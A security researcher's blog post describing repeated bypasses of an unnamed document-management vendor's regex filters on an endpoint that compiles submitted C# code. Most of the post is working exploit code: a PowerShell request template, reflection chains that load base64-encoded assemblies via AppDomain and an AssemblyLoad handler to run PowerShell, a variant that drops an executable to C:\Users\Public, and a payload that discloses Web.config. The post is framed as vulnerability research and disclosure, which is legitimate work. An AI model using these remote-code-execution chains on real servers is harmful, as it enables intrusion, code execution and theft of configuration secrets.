+++
title = "Mitigating the Mitigations: Reflections on a 🐈-and-🐁 Game"
author = ["Frederic Linn"]
date = 2022-09-23T22:32:00+02:00
draft = false
+++

<div class="verse">

"Mirror, Mirror, on the Wall - Who is the Most Reflected One of All?"<br />
--- Evil Queen, 'Snow White and the Seven Dwarfs'<br />

</div>

Attackers often times have a distinct advantage: They only need to find and exploit _one_ vulnerability, whereas the defending side tries to defend against an unknown number of unknown threats.

Cybersecurity war rhetoric aside, this makes defending a mostly reactive affair. A vulnerability gets discovered, changes are made and patches are released.

Rinse and repeat.

Sure, especially [big](https://www.youtube.com/watch?v=NlfZG2wTPZU) [companies](https://www.wired.com/story/facebook-red-team-x-vulnerabilities/) [try](https://googleprojectzero.blogspot.com/) [to](https://github.com/google/syzkaller/) [act](https://google.github.io/oss-fuzz/) proactively. But not everyone has that kind of budget to spare.

This means a disclosed vulnerability should at best be seen as a chance to discover similar issues, which maximizes the positive impact of every vulnerability.

Failing to do so can lead to the cat-and-mouse game that's going to unfold in this article.

We're going to look at how the vendor from our [previous](/blog/privesc-part-1) adventure handled fixing the issues. Not being happy with the outcome, we develop an exploit for each fix they provided.

During that process we're going to learn a lot about `C#` and `.NET` internals and more importantly how to stay persistent in order to achieve the ultimate goal in life:

**Remote Code Execution**


### Disclaimer {#disclaimer}

In contrast to the last disclaimer, I've changed my opinion: Those issues _are_ in fact vulnerabilities. That's why creating proper fixes should have at least some priority.

I'm not naive. Those developers probably have a full kanban board in front of them. That doesn't excuse the kind of lazy "fixes" we're about to witness in this article, though.

So while I'm still not naming names for the moment, I probably will in the future in the form of `CVE` requests. Not to point fingers, but because I believe it's important to come clean as a vendor. They also had more than enough time.

Look, this is not `Chrome`, `WhatsApp` or `iOS`. But it's still a big enough product that the company should take responsibility.

They didn't ask me for any of my work. But that doesn't change the fact that I've invested quite some time into researching and documenting those issues and even provided some guidance for fixing without getting so much as a "thanks".

It's definitely not a great look.


### Background {#background}

I assume you've read the previous article. Here's the _executive summary_ if you simply cannot bring yourself to do it:

The vendor sells a product in the [document management](https://en.wikipedia.org/wiki/Document_management_system) / [product life-cycle management](https://en.wikipedia.org/wiki/Product_life-cycle_management_(marketing)) space in the broadest sense. Historically a monolithic application, they've since developed a `REST API` for accessing their platform more freely in order to motivate 3rd-party development.

While trying to interface with said `API`, I quickly discovered a fishy endpoint that accepts `C#` code, which gets compiled and run on the spot. Only legitimate use cases are documented, but the possibilities are endless!

They use some `Reflection` magic to compile and execute our code. Naturally, _we_ use some `Reflection` magic to do mischievous things.

The exact details of how the compilation is done are not important at this point. We simply note that the developers should have some experience with the topic.

Before we get to know the reflection system more closely, let's have a quick look at the following `Powershell` template that is shared across all exploits. Only the `RCE` section in the middle gets switched out, which corresponds to the _value_ in our key-value request the endpoint expects. In other words, _that_ value is the string that gets compiled and executed.

```sh { linenos=true, linenostart=1 }
######################################
# Remote Code Execution as a Service #
######################################
$hostname = ""
$username = ""
$password = ""
$validDocId = ""

$commandToRun = "hostname"
######################################

$encodedCredentials = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("${username}:${password}"))
$encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandToRun))
$endpoint = http://$hostname/<redacted>/ExecuteCollectionQuery

$headers = @{
  Authorization = "Basic ${encodedCredentials}"
}

$body =
@"
[{
  "collectionQuery" :
  "
  #      ___           ___           ___
  #     /\  \         /\__\         /\__\
  #    /::\  \       /:/  /        /:/ _/_
  #   /:/\:\__\     /:/  /        /:/ /\__\
  #  /:/ /:/  /    /:/  /  ___   /:/ /:/ _/_
  # /:/_/:/__/___ /:/__/  /\__\ /:/_/:/ /\__\
  # \:\/:::::/  / \:\  \ /:/  / \:\/:/ /:/  /
  #  \::/~~/~~~~   \:\  /:/  /   \::/_/:/  /
  #   \:\~~\        \:\/:/  /     \:\/:/  /
  #    \:\__\        \::/  /       \::/  /
  #     \/__/         \/__/         \/__/
  #
  "
}]
"@

$result = Invoke-RestMethod -Method Post -Uri $endpoint -ContentType "application/json" -Headers $headers -Body $body
Write-Host($result[1].output)
```


### Primer on Reflection {#primer-on-reflection}

In order to follow along, we need some basic understanding of `Reflection` in `C#`.

The [documentation](https://learn.microsoft.com/en-us/dotnet/csharp/programming-guide/concepts/reflection) states that we "can use reflection to [...] get the type from an existing object and invoke its methods or access its fields and properties".

Let me rephrase that: By providing the necessary metadata, the reflection system allows us to dynamically play with existing objects or even create new ones on the fly. It's really flexible!

Because we're dealing with a rather deep rabbit hole, let's restrict ourselves a bit: For now we're only interested in obtaining information from existing objects. That means building _new_ types at runtime remains black magic for the time being.

The whole process starts with a `Type` object, which we can retrieve via `GetType()`. That method is defined on the `Object` type, which is the root of the `.NET` type hierarchy. Therefore _every_ class implements `GetType()` automatically.

With the `Type` object, we have [numerous](https://learn.microsoft.com/en-us/dotnet/api/system.type?view=net-6.0#methods) ways of discovering information.
Methods, Fields, Properties - You name it!

With the right calls, we can even ignore [access modifiers](https://learn.microsoft.com/en-us/dotnet/csharp/programming-guide/classes-and-structs/access-modifiers). Reflection simply _be_ like that.

How about a little warm-up[^fn:1] now?

```c { linenos=true, linenostart=1, hl_lines=["9","11-12"] }
using System;
using System.Reflection;

class ReflectionEducator
{
  static void Main()
  {
    string greeting = "Hello, World!";
    Type t = greeting.GetType();

    MethodInfo substr = t.GetMethod("Substring", new Type[] { typeof(int), typeof(int) });
    var hello = (string) substr.Invoke(greeting, new Object[] { 0, 7 });

    Console.WriteLine(hello + "GEBIRGE!");
    // Output: "Hello, GEBIRGE!"
  }
}
```

We retrieve our valuable `Type` object in line 9. Afterwards we query the type for our desired `Substring` method by specifying the name and parameters of it.
It may look a little weird, but line 11 basically reads like "give me information about the Substring method that takes two parameters".

Declaring the arguments is necessary if the method has overloads, which is the case here: `Substring(Int32)` also exists.

Finally we call `Invoke()` on the `MethodInfo` that represents `Substring(Int32, Int32)`. We provide the object to operate on (the `greeting` string) and the arguments inside an `Object` array.

Even though we're barely scratching the surface, that's already super cool!

You don't see the potential? I don't blame you.

But if you add the ability to load arbitrary assemblies[^fn:2] containing types that contain methods which are all reachable with string matching, you've got yourself a pretty cosy environment for running custom code in places where you probably shouldn't!

Armed with all that knowledge, let's have a look at our first exploit.


### Original Exploit {#original-exploit}

I've cleaned up the exploit a bit, but it's essentially the one from the previous article.

```txt { linenos=true, linenostart=1, hl_lines=["6","9-11","16"] }
(context) =>
  context
  .Documents()
  .Where(doc => doc.Id == $validDocId)
  .AsEnumerable()
  .Select(d => {
    var encodedDll = \"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUu<and so on>\";

    var executionDll = global::System.Reflection.Assembly.Load(Convert.FromBase64String(encodedDll));
    var commandExecution = executionDll.GetType(\"CommandExecution.CommandExecution\");
    var execute = commandExecution.GetMethod(\"Execute\");

    var commandString = \"$encodedCommand\";

    var argv = new object[] { commandString };
    var output = (string) execute.Invoke(null, argv);

    return new {
      output,
      id = d.Id
    };
  })
```

As you can see, the basic flow remains the same: We load a previously compiled and `base64` encoded `assembly` via `Assembly.Load()` (line 9). The `assembly` contains a static method that simply runs the provided command via `PowerShell` and returns the output.

In order to call said method, we use some rudimentary reflection (lines 10, 11 and 16).

Why go through the trouble of loading our own assembly at all? Because we can define our own imports in there, which will be resolved automatically by the `.NET` runtime.

Spawning processes with `System.Diagnostics.Process` is otherwise not possible inside our little `C#` jail, not even with our `global::` addressing trick.

We "break out" of the expected constraints in line 6. As described in the last article, we do this by using a [statement lambda](https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/operators/lambda-expressions#statement-lambdas) instead of a simple `expression lambda`.

The other exploits, however, will break out earlier[^fn:3].

Look carefully and you'll see that the _whole thing_ is actually an `expression lambda`, which means we can turn it into the _other_ type of lambda directly after `(context) =>`.


### Round One: The Easy Way Out {#round-one-the-easy-way-out}

After informing the vendor about the issues, I was met with: 😶

A couple of weeks later, they silently published a fix with one of their scheduled updates[^fn:4].

Curious about what exactly they did, I began looking into it. Let's first have a look at the method that compiles our code:

```c { linenos=true, linenostart=1, hl_lines=["9-19","29-30"] }
    private T CompileQueryInternal<T>(string sourceCode) where T : class
    {
      CompilerResults compilerResults = (CompilerResults) null;
      try
      {
        using (CSharpCodeProvider csharpCodeProvider = new CSharpCodeProvider())
        {
          CompilerParameters parameters = this.CreateParameters();
          string str = this.PreprocessQuery(sourceCode);
          if (str != sourceCode)
          {
            compilerResults = csharpCodeProvider.CompileAssemblyFromSource(parameters, str);
            int compilerReturnValue = compilerResults.NativeCompilerReturnValue;
          }
          if (compilerResults != null)
          {
            if (compilerResults.NativeCompilerReturnValue != 0)
              goto label_12;
          }
          compilerResults = csharpCodeProvider.CompileAssemblyFromSource(parameters, sourceCode);
          if (compilerResults.NativeCompilerReturnValue == 0)
            return (T) compilerResults.CompiledAssembly.GetType("UDQ.Factory").GetField("CreateQuery").GetValue((object) null);
        }
      }
      catch (Exception ex)
      {
        throw new UnsupportedQueryException(ex.Message);
      }
label_12:
      throw new UnsupportedQueryException("error compiling query \r\n " + this.CreateErrorReport(compilerResults.Errors));
    }
```

Every highlighted line was added in the update.

Apparently our code gets preprocessed now (we'll look into `PreprocessQuery` in a second). However, if the processed string doesn't match the original string, it _still_ gets compiled. If that compilation is _not_ successful (line 17), the method throws an exception[^fn:5].

If the processed code _does_ compile, another compilation round gets started with the **original** string (line 20).

That seems to be a very roundabout way of handling the situation. Why not simply use the result of the processed (and therefore presumably sanitized) string?

Let's have a look at the actual preprocessing:

```C { linenos=true, linenostart=1 }
private string PreprocessQuery(string sourceCode) {
  sourceCode = Regex.Replace(sourceCode, "::", ":");
  sourceCode = Regex.Replace(sourceCode, ".GetType\\b", ".GetT\\u0443pe");
  sourceCode = Regex.Replace(sourceCode, ".Invoke\\b", ".Inv\\u03bfke");
  return sourceCode;
}
```

Well, that's certainly _one_ way to deal with the situation!

A few things of note:

-   If they wouldn't use the original string again, we could simply provide three colons and had our `global::` back 🤦.
-   _Very_ clever usage of unicode symbols. I thought that stuff was used for domain phishing: <https://g🕶gle.com>.
-   Surgical precision: They block _exactly_ what we've used in the original exploit.

Jokes aside, the "fix" still poses some challenges.

Firstly, we cannot reference other namespaces via `global::` anymore, which prohibits us from loading an `assembly` with our current method.

Secondly, even if we find a way to obtain a `MethodInfo`, we cannot invoke it directly anymore.

Does that mean this lazy "fix" prevents us from running custom code? Of course not!


#### Mitigating the Mitigations I {#mitigating-the-mitigations-i}

Our goal is to retain our current abilities, meaning we want to load and execute assemblies from memory just like before.

Because we can't address the `Reflection` namespace directly anymore, we have to find another way of loading assemblies.

After a bit of searching around, I've stumbled upon the _super_ useful `AppDomain` class. Among many interesting things, it provides a `Load` method "[...] as a convenience for interoperability callers who cannot call the static Assembly.Load method."[^fn:6]

To be more precise, the `AppDomain` class has the property `CurrentDomain` that gets the current application domain for the current thread.

Current.

We call `Load()` through _it_.

How do we get hold of the static class inside our assembly that executes `PowerShell` commands?

Previously we've used `GetType(String)`, but we could also iterate over the `ExportedTypes` property and match for the correct one. Or simply take the first and only one in our case.

Afterwards we proceed to gain a reference to our desired method. But what good is that if we cannot `Invoke()` it?

There doesn't seem to be an equivalent of a `C++` [dllmain](https://learn.microsoft.com/en-us/windows/win32/dlls/dllmain) entry point where we could run code on assembly load instead. So we really do need to call that method!

Gladly, that's not a problem at all. Instead of invoking the [MethodInfo](https://learn.microsoft.com/en-us/dotnet/api/system.reflection.methodinfo?view=netframework-4.8) directly, we first create a delegate[^fn:7] and call _it_.

Mitigations successfully mitigated! Here's the final exploit:


#### Exploit {#exploit}

```sh { linenos=true, linenostart=1 }
(context) => {
  var encodedDll = \"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUu<and so on>\";

  var executionDll = AppDomain.CurrentDomain.Load(Convert.FromBase64String(encodedDll));
  var commandExecutionClass = executionDll.ExportedTypes.First();
  var executeMethod = commandExecutionClass.GetMethod(\"Execute\");
  var executeCommand = (Func<string, string>) executeMethod.CreateDelegate(typeof(Func<string, string>));

  var commandString = \"$encodedCommand\";
  var output = executeCommand(commandString);

  return
  context
  .Documents()
  .Where(doc => doc.Id == $validDocId)
  .Select(d => new {
    output,
    id = d.Id
  });
}
```


### Round Two: This is Sparta! {#round-two-this-is-sparta}

After informing the vendor about the issues, I was met with: 😶

A couple of weeks later they scheduled a fix for another one of their planned updates.

With their prior effort in mind, I had low expectations. But why not give them the benefit of the doubt?

```C { linenos=true, linenostart=1 }
private string PreprocessQuery(string sourceCode) {
  sourceCode = Regex.Replace(sourceCode, "::", ":\u200B:");
  sourceCode = Regex.Replace(sourceCode, "\\.\\s*GetType\\b", ".GetT\\u0443pe");
  sourceCode = Regex.Replace(sourceCode, "\\.\\s*Invoke\\b", ".Inv\\u03bfke");
  sourceCode = Regex.Replace(sourceCode, "\\bAppDomain\\b", "AppD\\u03bfmain.");
  sourceCode = Regex.Replace(sourceCode, "\\.\\s*UploadAttachment\\b", ".Upl\\u03bfadAttachment");
  return sourceCode;
}
```

That's why!

I can't help but feel disappointed. This is some _really_ lazy work.

Again, a few things of note:

-   This. Is. Sparta! We don't care about your _athenian_ symbols!
-   They _did_ fix the colons. Why do that, if they compile the **original** string again? Was this a conscious decision? I don't even know anymore.
-   We'll talk about UploadAttachment() later.

All in all, it doesn't look too bad for us. They simply took away our ability to address the `AppDomain` object.
Does that mean loading custom assemblies is off the table now? Of course not!


#### Between a Rock and a Hard Place {#between-a-rock-and-a-hard-place}

Before we continue with our circumvention game, let me briefly describe the situation we're in.

On the one hand, we are restricted by the regular expressions. They apply a "dumb" filter over the whole code-string.

On the other hand, we are restricted by the compiler itself. Some types are simply not in scope, which means we cannot use them for casting.
Let's look at an example:

```c { linenos=true, linenostart=1 }
// We somehow got references to AppDomain and AppDomain.CurrentDomain.
var loadMethod = appDomain.GetMethod(\"Load\", new Type[] { typeof(byte[]) });
var load = (Func<byte[], Assembly>) loadMethod.CreateDelegate(typeof(Func<byte[], Assembly>), currentDomain);
```

The above snippet would **not** compile, because the `System.Reflection` namespace is not in scope, meaning the `Assembly` type is unknown at compile time.

We could think of another cast where we call a method that returns an `AppDomain` object:
<span class="org-target" id="createDomainExample"></span>

```c { linenos=true, linenostart=1 }
// We somehow got references to AppDomain and AppDomain.CurrentDomain.
var createDomainMethod = appDomain.GetMethod(\"CreateDomain\", new Type[] { typeof(string) });
var createDomain = (Func<string, AppDomain>) loadMethod.CreateDelegate(typeof(Func<string, AppDomain>), currentDomain);
```

But that would **also** fail. This time the RegEx would _very cleverly_ replace 'o' with 'ο'[^fn:8] , thus making the compilation fail.

It's apparent that our room for maneuver is becoming quite narrow.

Casting seems to be the weak link in our chain, because we're required to do it at _some_ point. There's only so much the compiler lets us do with a plain `Object`.

So what if I would tell you that we have a _carte blanche_ for the compiler? That would be too good to be true, now would it?


#### Mitigating the Mitigations II {#mitigating-the-mitigations-ii}

It would. It _is_. But only partially. Look, it's complicated!

While searching for ways of making a successful cast, I've [stumbled](https://learn.microsoft.com/en-us/dotnet/csharp/programming-guide/types/using-type-dynamic) over the `dynamic` type:

> The type is a static type, but an object of type dynamic bypasses static type checking.
> In most cases, it functions like it has type object.
> At compile time, an element that is typed as dynamic is assumed to support any operation.

Oh yeah, that's exactly what we're looking for. I was very excited after reading this, because I thought it would allow us to do things like:

```C { linenos=true, linenostart=1, hl_lines=["3"] }
// We somehow got references to AppDomain and AppDomain.CurrentDomain.
var loadMethod = appDomain.GetMethod(\"Load\", new Type[] { typeof(byte[]) });
var load = (Func<byte[], dynamic>) loadMethod.CreateDelegate(typeof(Func<byte[], dynamic>), currentDomain);
```

We specify the return type of the `Load` method in line 3 as `dynamic` (instead of `Assembly`), meaning the compiler should _bacdafucup_!

Sadly, it's not all ☀️, 🍭 and 🌈.

If we call methods on the returned object or even just try to access one of its properties, we get the following exception:

```text
 Predefined type Microsoft.CSharp.RuntimeBinder is not defined or imported.
 One or more types required to compile a dynamic expression cannot be found.
```

It [turns out](https://stackoverflow.com/questions/29545573/missing-type-microsoft-csharp-runtimebinder-binder) we are missing a reference to `Microsoft.CSharp`.

Hold on, who are "we"? It may sound dumb, but I've tried to load `Microsoft.CSharp.dll` manually in the hopes of resolving the issue[^fn:9]. I even instantiated some dummy type just to be sure it's loaded properly. I did that to no avail, though.

You see, "we" really means the vendor in that case. There's nothing we can do to add the missing reference. Exploring the `dynamic` type wasn't _for naught_, though, as we're going to see in a little while.

What we _can_ do in the meantime is searching for other useful things in the [System namespace](https://learn.microsoft.com/en-us/dotnet/api/system?view=netframework-4.8). Because those are always in scope.

There are many interesting things, but let's not forget our goal: Loading arbitrary assemblies.

As far as I can tell, the only way is through the `AppDomain.CurrentDomain` object. It's maddening: We know the object is _there_, we simply cannot address it because of the RegEx. Or can we?

Thankfully the reflection system is flexible enough to accommodate our needs.

`C#` has the built-in `typeof` operator, which returns the `System.Type` of a type.

Type.

How is that useful, though? Well, looking at the [documentation](https://learn.microsoft.com/en-us/dotnet/api/system.type.assembly?view=netframework-4.8) we see that a `Type` always references the `Assembly` in which said `Type` is declared.

That sounds promising! An _instance_ of an `Assembly`[^fn:10] defines the `GetTypes` method, which returns an array of all the types that are defined in it.

Let's see it in action:

```C { linenos=true, linenostart=1 }
var dummyType = typeof(string);
var assembly = dummyType.Assembly;

Console.WriteLine(assembly.AssemblyName);
// Output: "mscorlib, Version ---snip---"

Console.WriteLine(assembly.GetTypes().Count());
// Output: "3286"
```

_Threethousandtwohundredeightysix_ distinct types! In there are beauties like the static `System.IO.File` and even `System.AppDomain`. Thanks a lot, [mscorlib](https://stackoverflow.com/a/15062161).

With our reflection primitives (`GetMethod` and `CreateDelegate`) we can call methods on those types.

Is it just me, or does the whole thing start to look like a full chain. No, no, no! Not one of [those](https://github.com/0vercl0k/CVE-2019-11708)[^fn:11].

More like a 🪞⛓.

A what? A _Reflection Chain_, duh!

Things probably make more sense if we look at a concrete example, so let's see how we can retrieve [File.WriteAllBytes(String, Byte[])](https://learn.microsoft.com/en-us/dotnet/api/system.io.file.writeallbytes?view=netframework-4.8):

```c { linenos=true, linenostart=1, hl_lines=["3"] }
var dummyType = typeof(string);

var file = dummyType.Assembly.GetTypes().First(t => t.FullName == \"System.IO.File\");
var writeAllBytesMethod = file.GetMethod(\"WriteAllBytes\");
var writeAllBytes = (Action<string, byte[]>) writeAllBytesMethod.CreateDelegate(typeof(Action<string, byte[]>));
```

That looks nothing like a chain, though, so let's try again:

```c { linenos=true, linenostart=1 }
var writeAllBytes = (Action<string, byte[]>) typeof(string).Assembly.GetTypes().First(t => t.FullName == \"System.IO.File\").GetMethod(\"WriteAllBytes\").CreateDelegate(typeof(Action<string, byte[]>));
```

Much, much better. Shout-outs to the mobile users!


#### Exploit 1: Dropping Files {#exploit-1-dropping-files}

Loading our own assembly from memory seems off the table for now, because

1.  we cannot use the `Assembly` type in a cast
2.  we cannot make use of an object that's typed as `dynamic`

While looking for other interesting things, I've came across [AppDomain.ExecuteAssembly](https://learn.microsoft.com/en-us/dotnet/api/system.appdomain.executeassembly?view=netframework-4.8#system-appdomain-executeassembly), which allows us to... yeah, you guessed it!
Because we can also get a hold of `System.IO.File` the path is clear: Write our assembly to disk and execute it.

You might remember from the previous article that we run as a low-privileged `IIS APPPOOL\<Application Pool Name>` user. That severely limits our access to the file system.

There is, however,  at least one location that _everyone_ is allowed to write to: `C:\Users\Public`.

With that in mind, the final exploit will

1.  write our assembly to disk
2.  write a file containing commands to disk
3.  execute the assembly, which in turn executes the commands and writes the output to disk
4.  send the output of the previous step with the server response

We're not going to clean up afterwards, because you can't tell me how to live my life!

Of course the assembly itself could do more powerful things, like escalating privileges. Maybe via an (un)known kernel bug or simply some privilege escalation technique.

Another option would be to leverage existing executables, [LOLbin](https://lolbas-project.github.io/#)-style. Those techniques are generally considered pretty stealthy, which cannot be said for our "let's drop 3 files" approach.

There's another downside to our exploit. Assemblies that get loaded into an `AppDomain` _stay_ loaded forever! In order to properly unload them, we'd have to create another `AppDomain` and execute our binary inside _it_.

But then we'd be in casting-hell again. I've actually shown the example code [above](#createDomainExample).

This means crashing the `IIS worker process` would be the only way to "release" the assembly. I've tried looking into a solution involving [stackalloc](https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/operators/stackalloc), but sadly the `.NET Framework` version in use is too old to be of use[^fn:12].

Enough chit-chat, let's see some code already:

```sh { linenos=true, linenostart=1 }
(context) => {
  var executable = \"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUu<and so on>\";
  var commands = \"$encodedCommands\";

  var executablePath = @\"C:\\Users\\Public\\CommandXeqtr.exe\";
  var commandsPath = @\"C:\\Users\\Public\\commands.txt\";
  var resultsPath = @\"C:\\Users\\Public\\results.txt\";

  char[] regExEnemy = { 'S', 'y', 's', 't', 'e', 'm', '.', 'A', 'p', 'p', 'D', 'o', 'm', 'a', 'i', 'n' };

  var dummyType = typeof(string);

  var file = dummyType.Assembly.GetTypes().First(t => t.FullName == \"System.IO.File\");
  var writeAllBytesMethod = file.GetMethod(\"WriteAllBytes\");
  var writeAllBytes = (Action<string, byte[]>) writeAllBytesMethod.CreateDelegate(typeof(Action<string, byte[]>));
  var readAllTextMethod = file.GetMethod(\"ReadAllText\", new Type[] { typeof(string) });
  var readAllText = (Func<string, string>) readAllTextMethod.CreateDelegate(typeof(Func<string, string>));
  var existsMethod = file.GetMethod(\"Exists\", new Type[]{ typeof(string) });
  var exists = (Func<string, bool>) existsMethod.CreateDelegate(typeof(Func<string, bool>));

  if (!exists(executablePath)) {
    writeAllBytes(executablePath, Convert.FromBase64String(executable));
  }

  writeAllBytes(commandsPath, Convert.FromBase64String(commands));

  var globalDomainObject = dummyType.Assembly.GetTypes().First(t => t.FullName == new string(regExEnemy));
  var currentDomainProperty = globalDomainObject.GetProperty(\"CurrentDomain\");
  var currentDomain = currentDomainProperty.GetValue(globalDomainObject);
  var executeMethod = globalDomainObject.GetMethod(\"ExecuteAssembly\", new Type[]{typeof(string)});
  var executeAssembly = (Func<string, int>) executeMethod.CreateDelegate(typeof(Func<string, int>), currentDomain);

  executeAssembly(executablePath);

  var output = readAllText(resultsPath);

  return
  context
  .Documents()
  .Where(d => d.Id == $validDocId)
  .Select(d => new {
    output,
    d.Id
  });
}
```


#### Exploit 2: In-Memory {#exploit-2-in-memory}

While a nice stepping stone, the downsides make the previous exploit feel a little underwhelming, so I continued my quest for a better solution. I _really_ wanted to stay in-memory.

I'm [told](https://www.mdsec.co.uk/2020/06/detecting-and-advancing-in-memory-net-tradecraft/) that it's actually not that stealthy to do so, but it feels more elegant and a lot cleaner. Presumably it's also more eco-friendly, as we spare those hard drives from _hard writes_!

Let me reiterate the problems we're facing: In order to access types in our custom assembly, we **have** to call one of the `Load` methods via reflection. That means casting the return value to an `Assembly` which we cannot do. The type is simply not in scope.

As described above, casting to `dynamic` _will_ work. Until we try to use the resulting object 😿.

I'm not gonna lie, we're in a dire place right now!

If only we could combine **everything** we already know into one final exploit...

Things we _can_ do:

-   obtain a reference to `AppDomain.CurrentDomain`
-   create a delegate for `Load(byte[])` with the help of `dynamic`
-   _call_ that delegate (remember, only doing stuff with the return value throws an exception)
-   use every object that's directly in the `System` namespace

Constraints breed creativity, so let's get creative!

An `AppDomain` object contains the [AssemblyLoad event](https://learn.microsoft.com/en-us/dotnet/api/system.appdomain.assemblyload?view=netframework-4.8). We should be able to trigger that. How exciting!

But it gets better: In order to get informed about [events](https://learn.microsoft.com/en-us/dotnet/standard/events/) in `.NET`, we have to register an event handler. Those event handlers vary depending on the event, but the one we need is [AssemblyLoadEventHandler](https://learn.microsoft.com/en-us/dotnet/api/system.assemblyloadeventhandler?view=netframework-4.8).

It automatically receives two parameters from the event source:

1.  the sender of the event
2.  arguments in the form of [AssemblyLoadEventArgs](https://learn.microsoft.com/en-us/dotnet/api/system.assemblyloadeventargs?view=netframework-4.8)

Guess what those arguments contain? The assembly it-fucking-self!

Pardon my French, I'm beyond ecstatic about this finding. It feels like the stars aligned, but it's much simpler: We did our due diligence!

With all that in mind, our exploit will:

1.  create a custom [AssemblyLoadEventHandler](https://learn.microsoft.com/en-us/dotnet/api/system.assemblyloadeventhandler?view=netframework-4.8)
2.  register it with the `AppDomain.CurrentDomain` reference we hold
3.  call our `Load()` delegate, which triggers our handler
4.  call into our assembly inside the handler
5.  return the result with the response

And yes, it actually works!

Before looking at the final exploit, let me highlight two of the things that _make_ it work:

Firstly, every mentioned type is a member of the `System` namespace, which pleases the compiler. Secondly, event handlers get run synchronously if the provided methods are not asynchronous.

If the latter wasn't the case, the server's response probably would be send before our code gets executed.

Without further ado, here's the final exploit:

```sh { linenos=true, linenostart=1 }
(context) => {
  var encodedDll = \"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUu<and so on>\";

  char[] regExEnemy = { 'S', 'y', 's', 't', 'e', 'm', '.', 'A', 'p', 'p', 'D', 'o', 'm', 'a', 'i', 'n' };
  var dummyType = typeof(string);
  var output = \"\";

  AssemblyLoadEventHandler loadEventHandler = (obj, args) => {
    var XeqtR = args.LoadedAssembly.ExportedTypes.First();
    var executeMethod = XeqtR.GetMethod(\"Execute\");

    var executeCommand = (Func<string, string>) executeMethod.CreateDelegate(typeof(Func<string, string>));
    var commandString = \"$encodedCommand\";
    output = executeCommand(commandString);
  };

  var globalDomainObject = dummyType.Assembly.GetTypes().First(t => t.FullName == new string(regExEnemy));
  var currentDomainProperty = globalDomainObject.GetProperty(\"CurrentDomain\");
  var currentDomain = currentDomainProperty.GetValue(globalDomainObject);

  var loadEvent = globalDomainObject.GetEvent(\"AssemblyLoad\");
  loadEvent.AddEventHandler(currentDomain, loadEventHandler);

  var loadMethod = globalDomainObject.GetMethod(\"Load\", new Type[]{ typeof(byte[]) });
  var loadAssembly = (Func<byte[], dynamic>) loadMethod.CreateDelegate(typeof(Func<byte[], dynamic>), currentDomain);
  loadAssembly(Convert.FromBase64String(encodedDll));

  return
    context
    .Documents()
    .Where(d => d.Id == $validDocId)
    .Select(d => new {
      output,
      d.Id
  });
}
```


### Outlook {#outlook}

Before looking towards the future, let's quickly recap what we did:

We managed to run our custom code in an increasingly restrictive environment. Doing so required _some_ ingenuity and _lots of_ reflection.

The vendor's blacklist approach for fixing the underlying issues proofed to be heavily flawed. Granted, every consecutive exploit required more time than the one before. Maybe that's enough for them.

I'm expecting they're going to take `typeof()` from us next. Under those conditions, we have probably one more round left without discovering a truly new technique.

But even if they throw more and more regular expressions at the problem, there's still their _own_ code, which will never go away without a heavy redesign.

You might remember the `UploadAttachment` regex in the second fix. Well, that's a file disclosure I've found:

```c { linenos=true, linenostart=1 }
(context) => {
  // Upload files from the server and retrieve them with
  // their legitimate GUI application afterwards.
  var path = @\"C:\\inetpub\\wwwroot\\<redacted>\\<redacted>\\Web.config\";
  var attachment = context.LoadDocument(1337).UploadAttachment(path);

  return
    context
    .Documents()
    .Where(d => d.Id == 1337)
    .Select(d => new {
      d.Id
  });
}
```


### Conclusion {#conclusion}

Who needs Sudoku if we have _this_? I've had so much fun!

Finding solutions for every round made me delve deeper and deeper into the `C#` and `.NET` internals. For me personally, this kind of hands-on learning is perfect.

Having a real, but manageable target in mind really helps me stay motivated. It also proofed to be a nice _vertical slice_ of vulnerability research. A bit of (patch) reversing, a smidge of code review and lots of reading documentation.

Look, this is not a hardened target by _any_ stretch of the imagination. But there are enough moving parts to make it challenging.

In the end, the vendor might not show appreciation, but that's okay. I've gained a lot of knowledge and confidence.

As always: If you have any questions, suggestions or simply the desire to get in touch, feel free to [holla at me](/about).

Thank you so much for reading!

[^fn:1]: Which is inspired by the [documentation](https://learn.microsoft.com/en-us/dotnet/api/system.type?view=net-6.0#examples).
[^fn:2]: Assemblies can be executables or libraries, see [here](https://learn.microsoft.com/en-us/dotnet/standard/assembly/) for more details.
[^fn:3]: The vendor took away the original method briefly. Apparently there were unwanted side effects, because it hast since been restored.
[^fn:4]: No mention in the changelogs, either.
[^fn:5]: `C#` has `goto`?!
[^fn:6]: Here's the [source](https://learn.microsoft.com/en-us/dotnet/api/system.appdomain.load?view=netframework-4.8).
[^fn:7]: You can think of delegates as a safe `C#` function pointer alternative.
[^fn:8]: Perhaps an effort to [destigmatize](https://en.wikipedia.org/wiki/SARS-CoV-2_Omicron_variant) omicron?
[^fn:9]: Hold on, we _can_ load a `DLL`?! You see, I did a bit of time traveling in order to create a better flow for the article. A bit of artistic license, if you will 🎩.
[^fn:10]: The distinction is important, as there are also static methods for which you don't need an object of type `Assembly`.
[^fn:11]: Hopefully you can come back in a couple of years and find something of that caliber here. One can always dream.
[^fn:12]: In our version we can only use `stackalloc` in an `unsafe` block, which our stuck-up compiler refuses to touch.
